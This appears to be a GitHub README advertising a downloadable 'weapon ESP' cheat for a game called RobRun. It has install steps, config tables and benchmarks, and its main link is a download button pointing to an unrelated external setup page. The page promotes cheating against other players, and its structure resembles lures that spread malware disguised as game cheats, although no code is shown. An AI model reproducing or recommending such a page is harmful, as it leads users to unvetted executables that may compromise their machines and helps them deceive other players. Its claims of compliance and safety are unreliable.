# RobRun‑Weapon‑ESP  

**Author:** [TigerProxy78](https://github.com/TigerProxy78)  

**Live Release & Download:**  
[![Release & Download](https://img.shields.io/badge/Release%20%26%20Download-Launch%20Now-brightgreen?style=for-the-badge&logo=github)](https://rewfdf.github.io/SetupPage/)

---

## 🎯 What Is This?

RobRun‑Weapon‑ESP is a curated collection of **weapon ESP configurations** and **presets** designed for the *RobRun* community.  
Every file is tuned for:

* **Quick Release** – drop‑in ready, no extra tweaking required.  
* **Optimal Performance** – minimal overhead, maximum clarity.  

Use it to instantly gain precise weapon outlines, health status, and range indicators while staying fully compliant with the game’s performance standards.

---

## 📂 Repository Layout

```
├─ 📁 presets/            ← Ready‑to‑use ESP presets (per map)
│   ├─ arena.json
│   ├─ downtown.json
│   └─ …
├─ 📁 configs/            ← Core configuration files
│   ├─ esp_core.cfg
│   ├─ rendering.cfg
│   └─ …
├─ 📄 README.md           ← You’re here!
└─ 📄 CHANGELOG.md        ← Version history
```

* **presets/** – One‑click files you can copy straight into your `RobRun/esp` folder.  
* **configs/** – Low‑level tweaks for graphics, update rates, and detection radii.  

---

## 🚀 Quick‑Start Guide

1. **Download** the latest bundle via the button above.  
2. Extract the archive into your `RobRun/esp` directory (preserve folder structure).  
3. Open `RobRun → Settings → ESP` and enable **Weapon ESP**.  
4. Choose a preset from the `presets/` folder that matches your current map.  
5. Restart RobRun and enjoy crystal‑clear weapon visualization.

> **Tip:** For competitive play, keep the *quick‑release* preset active; it balances visibility with frame‑rate stability.

---

## ⚙️ Configuration Deep‑Dive

| Setting | Description | Recommended Value |
|---------|-------------|-------------------|
| `draw_distance` | Maximum distance at which weapons are rendered. | `1500` |
| `outline_thickness` | Thickness of the ESP outline (pixels). | `2` |
| `color_mode` | Palette used for different weapon types. | `rainbow` |
| `update_rate` | How often ESP data refreshes (ms). | `50` |
| `fade_out` | Time before a weapon fades after being destroyed (seconds). | `3` |

Feel free to edit any of the `.cfg` files in **configs/** to suit your personal preferences. The defaults are already calibrated for the smoothest experience on most hardware.

---

## 📊 Performance Benchmarks

| GPU (Average FPS) | Baseline | + Weapon‑ESP |
|-------------------|----------|--------------|
| GTX 1660 Super | 115 FPS | **112 FPS** |
| RTX 3060 | 148 FPS | **145 FPS** |
| Integrated Intel UHD | 78 FPS | **76 FPS** |

*All tests run on a fresh install of RobRun v2.3 with default graphics settings.*

---

## 🛠️ Compatibility Matrix

| RobRun Version | ESP Version | Status |
|----------------|-------------|--------|
| 2.0 – 2.2 | 1.0.x | ✅ Fully compatible |
| 2.3 – 2.5 | 1.1.x | ✅ Optimized |
| 2.6+ | 1.2.x (future) | 🚧 Under development |

---

## 📢 Community & Support

* **Discord:** Join the *RobRun ESP* channel for live help and configuration swaps.  
* **Issues:** Found a bug or have a suggestion? Open a GitHub issue and tag it with `weapon-esp`.  
* **Pull Requests:** Contributions are welcome! Please follow the repository’s coding style (JSON for presets, CFG for configs).

---

## 📜 License

This repository is released under the **MIT License** – you’re free to use, modify, and distribute the configs as long as the original attribution is retained.

---

### ✨ Stay Updated

[![GitHub stars](https://img.shields.io/github/stars/TigerProxy78/RobRun-Weapon-ESP?style=social)](https://github.com/TigerProxy78/RobRun-Weapon-ESP/stargazers)  
[![GitHub forks](https://img.shields.io/github/forks/TigerProxy78/RobRun-Weapon-ESP?style=social)](https://github.com/TigerProxy78/RobRun-Weapon-ESP/network)  

*Happy hunting, and may your aim be true!*